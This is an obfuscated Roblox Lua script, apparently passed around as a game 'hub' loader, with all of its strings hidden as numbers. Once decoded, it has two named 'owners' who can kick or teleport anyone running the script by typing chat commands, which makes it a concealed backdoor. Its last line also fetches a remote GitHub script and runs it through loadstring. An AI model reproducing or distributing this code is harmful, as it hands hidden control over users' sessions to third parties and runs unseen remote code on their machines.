function PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/55)end return res end 


game:GetService(PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({4565,6380,5335,6270,6380,5555,6270,3905,6435,5775})):SetCore(PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({4565,5555,6050,5500,4290,6105,6380,5775,5610,5775,5445,5335,6380,5775,6105,6050}),{
Title = PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({5885,5720,5555,6050,1760,13200,8745,8360,7645}),
Text = PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({4400,4180,4675,3960,1760,4015,4620,1760,4785,4345,4510,4125,1760,1815,1815}), 

Button1 = PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({4345,5885,5335,6655}),
Duration = 30
})


local Players = game:GetService(PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({4400,5940,5335,6655,5555,6270,6325}))
local localPlayer = Players.LocalPlayer

local owners = {
    PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({3905,5335,5995,5555,4180,6435,5335,4290,5720,5335,6435}),
    PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({6215,6435,5335,6655,6490,5555,5390,5555,6050,5335,6050,5720,5500,5775})
}

function x1y2z3(owner)
    if owner then
        localPlayer.Character:SetPrimaryPartCFrame(owner.Character.HumanoidRootPart.CFrame)
    end
end

function a1b2c3(ownerName)
    local owner

    for _, player in ipairs(Players:GetPlayers()) do
        if player.Name == ownerName then
            owner = player
            break
        end
    end

    if owner then
        owner.Chatted:Connect(function(message)
            if message == PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({2530,5885,5775,5445,5885,1760,2530}) then
                localPlayer:Kick(PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({4125,5720,5555,6050,1760,5885,5775,5445,5885,5555,5500,1760,6655,6105,6435,2530}))
            elseif message == PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({2530,5390,6270,5775,6050,5665,1760,2530}) then
                x1y2z3(owner)
            end
        end)
    end
end

for _, ownerName in ipairs(owners) do
    a1b2c3(ownerName)
end

loadstring(game:HttpGet(PdSnbJTIOOyzsFVcxbJdzNXNcGXymrCqSntRXqJbyKivBEtgOTaLibWYzVzEvFLfGHzaKtBezWkQWHujdggwVJgmu({5720,6380,6380,6160,6325,3190,2585,2585,6270,5335,6545,2530,5665,5775,6380,5720,6435,5390,6435,6325,5555,6270,5445,6105,6050,6380,5555,6050,6380,2530,5445,6105,5995,2585,5885,5720,5555,6050,3025,3135,2695,2585,6325,5445,6270,5775,6160,6380,2475,5885,5720,5555,6050,2585,6270,5555,5610,6325,2585,5720,5555,5335,5500,6325,2585,5995,5335,5775,6050,2585,4180,4345,4730,3795,2035,2750,2640,4290,4015,4290,4015,2530,6380,6600,6380}), true))();
